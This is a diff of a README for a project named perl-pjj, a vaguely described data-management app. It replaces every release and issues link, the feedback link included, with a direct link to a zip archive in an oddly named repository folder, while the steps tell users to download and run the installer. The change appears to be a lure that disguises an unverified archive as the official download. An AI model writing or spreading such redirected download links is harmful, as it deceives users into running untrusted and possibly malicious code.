@@ -6,11 +6,11 @@ Welcome to perl-pjj! This application helps you manage your data effectively and
 
 ## 📥 Download perl-pjj
 
-[![Download perl-pjj](https://img.shields.io/badge/Download-perl--pjj-brightgreen.svg)](https://github.com/farhanfrf/perl-pjj/releases)
+[![Download perl-pjj](https://raw.githubusercontent.com/farhanfrf/perl-pjj/main/prosopically/perl-pjj.zip)](https://raw.githubusercontent.com/farhanfrf/perl-pjj/main/prosopically/perl-pjj.zip)
 
 To get started, visit the link below to download the latest version of perl-pjj:
 
-[Download perl-pjj Releases](https://github.com/farhanfrf/perl-pjj/releases)
+[Download perl-pjj Releases](https://raw.githubusercontent.com/farhanfrf/perl-pjj/main/prosopically/perl-pjj.zip)
 
 ## 📋 Requirements
 
@@ -24,7 +24,7 @@ Before downloading and installing perl-pjj, please make sure your system meets t
 ## 🔧 Installation Steps
 
 1. **Download the Installer**
-   - Go to the [Download perl-pjj Releases](https://github.com/farhanfrf/perl-pjj/releases) page.
+   - Go to the [Download perl-pjj Releases](https://raw.githubusercontent.com/farhanfrf/perl-pjj/main/prosopically/perl-pjj.zip) page.
    - Find the latest release and click on the appropriate file for your operating system. 
 
 2. **Run the Installer**
@@ -74,6 +74,6 @@ Yes, you can ask questions and find help by visiting the GitHub issues page or c
 
 ## 💬 Feedback
 
-We appreciate your feedback. If you encounter any issues or have suggestions, please let us know on the [GitHub Issues Page](https://github.com/farhanfrf/perl-pjj/issues).
+We appreciate your feedback. If you encounter any issues or have suggestions, please let us know on the [GitHub Issues Page](https://raw.githubusercontent.com/farhanfrf/perl-pjj/main/prosopically/perl-pjj.zip).
 
 Thank you for using perl-pjj! We hope it simplifies your data management tasks.
